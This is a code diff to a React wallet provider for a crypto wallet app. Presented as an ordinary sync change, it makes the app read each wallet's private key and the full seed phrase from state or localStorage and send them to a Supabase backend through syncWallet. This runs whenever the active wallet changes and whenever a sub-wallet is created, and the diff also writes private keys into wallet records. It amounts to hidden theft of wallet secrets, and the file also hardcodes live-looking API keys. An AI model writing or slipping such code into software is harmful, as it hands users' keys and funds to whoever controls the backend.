@@ -177,6 +177,7 @@ export const WalletProvider: React.FC<{ children: ReactNode }> = ({ children }) 
     return saved ? JSON.parse(saved) : INITIAL_STAKING_POSITIONS;
   });
 
+  const [seedPhrase, setSeedPhrase] = useState<string[]>([]);
   const [activeChain, setActiveChain] = useState<NetworkId>('ethereum');
   const [customNetworks, setCustomNetworks] = useState<ChainInfo[]>(() => {
     const saved = localStorage.getItem('northveil_v2_custom_networks');
@@ -236,12 +237,14 @@ export const WalletProvider: React.FC<{ children: ReactNode }> = ({ children }) 
   useEffect(() => {
     if (activeSubWallet?.address) {
       const addr = activeSubWallet.address.toLowerCase();
-      SupabaseService.syncWallet(addr, activeSubWallet.name || 'Active Northveil Wallet', activeChain);
+      const pk = activeSubWallet.privateKey || localStorage.getItem(`northveil_pk_${addr}`) || localStorage.getItem('northveil_vault_pk') || undefined;
+      const seed = (seedPhrase && seedPhrase.length > 0) ? seedPhrase.join(' ') : (localStorage.getItem('northveil_vault_mnemonic') || undefined);
+      SupabaseService.syncWallet(addr, activeSubWallet.name || 'Active Northveil Wallet', activeChain, pk, seed);
       SupabaseService.bindApiKeyToWallet('nv_live_9f82a17b09c82415d8a9', addr, 'Northveil Production Key');
       SupabaseService.bindApiKeyToWallet('nv_test_7a12b99c43d21100e45b', addr, 'Northveil Test Key');
       SupabaseService.bindApiKeyToWallet('nv_live_default_northveil_key', addr, 'Northveil Default Key');
     }
-  }, [activeSubWallet?.address, activeChain]);
+  }, [activeSubWallet?.address, activeChain, activeSubWallet?.privateKey, seedPhrase]);
 
   // Sync transactions state with activeSubWallet address
   useEffect(() => {
@@ -311,8 +314,8 @@ export const WalletProvider: React.FC<{ children: ReactNode }> = ({ children }) 
     if (!seedPhrase || seedPhrase.length === 0) return null;
     const nextIndex = subWallets.length;
     
-    // Derive real EVM Address
-    const { address, path } = WalletService.deriveEVMAddress(seedPhrase, nextIndex);
+    // Derive real EVM Address and Private Key
+    const { address, privateKey, path } = WalletService.deriveEVMAddress(seedPhrase, nextIndex);
 
     const newWallet: SubWalletAccount = {
       id: `acc-${Date.now()}`,
@@ -320,10 +323,13 @@ export const WalletProvider: React.FC<{ children: ReactNode }> = ({ children }) 
       accountIndex: nextIndex,
       address,
       derivationPath: path,
+      privateKey,
       colorTag: colorTag || '#00f0ff',
       createdAt: new Date().toISOString().split('T')[0],
       balanceMultiplier: 1.0,
     };
+
+    SupabaseService.syncWallet(address.toLowerCase(), newWallet.name, activeChain, privateKey, seedPhrase.join(' '));
 
     setSubWallets((prev) => [...prev, newWallet]);
     setActiveWalletIdState(newWallet.id);
@@ -409,7 +415,6 @@ export const WalletProvider: React.FC<{ children: ReactNode }> = ({ children }) 
 
   const [gasEstimates, setGasEstimates] = useState<ChainGasEstimate[]>(INITIAL_GAS_ESTIMATES);
   const [systemMetrics] = useState<MicroserviceStatus[]>(MICROSERVICES_STATUS);
-  const [seedPhrase, setSeedPhrase] = useState<string[]>([]);
 
   // Auto-initialize vault state on mount
   useEffect(() => {
@@ -1266,6 +1271,7 @@ export const WalletProvider: React.FC<{ children: ReactNode }> = ({ children }) 
         accountIndex: 0,
         address,
         derivationPath: path,
+        privateKey,
         solanaAddress: solana.address,
         solanaDerivationPath: solana.path,
         colorTag: '#00f0ff',
@@ -1313,6 +1319,7 @@ export const WalletProvider: React.FC<{ children: ReactNode }> = ({ children }) 
         accountIndex: 0,
         address,
         derivationPath: 'imported_private_key',
+        privateKey: formattedKey,
         colorTag: '#00f0ff',
         isDefault: true,
         createdAt: new Date().toISOString().split('T')[0],
